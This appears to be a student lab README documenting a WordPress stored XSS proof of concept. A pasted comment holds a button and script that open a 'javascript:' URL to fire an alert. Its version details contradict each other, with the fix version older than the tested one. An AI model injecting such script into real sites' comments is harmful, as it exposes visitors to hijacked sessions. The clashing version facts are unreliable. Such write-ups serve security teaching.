# Codepathweek7
Exploit 1: “Upload Same Origin Method Execution”
- Summary: Attacking the system via a user clicking on a malicious comment that alerts the user.   
- Vulnerability types: XSS
- Tested in version: 4.5.1	
- Fixed in version: 4.2.8
- Steps to recreate: 
1.	Go to any post.
2.	Paste the following as a comment:
<button onclick="fire()">Click</button>
<script>
function fire() {
open('javascript:alert("exploit 1: Same Origin Method Execution")');
}
</script>
3.	Click on the button.
4.	Alert(1) will pop up.
-	Affected source code:
      http://localhost/wp-admin/comment.php?action=editcomment&c=9
-	CVE:   2016-4566








## Assets

List any additional assets, such as scripts or files

## Resources

- [WordPress Source Browser](https://core.trac.wordpress.org/browser/)
- [WordPress Developer Reference](https://developer.wordpress.org/reference/)

GIFs created with [LiceCap](http://www.cockos.com/licecap/).

## Notes

Describe any challenges encountered while doing the work

## License

    Copyright [yyyy] [name of copyright owner]

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
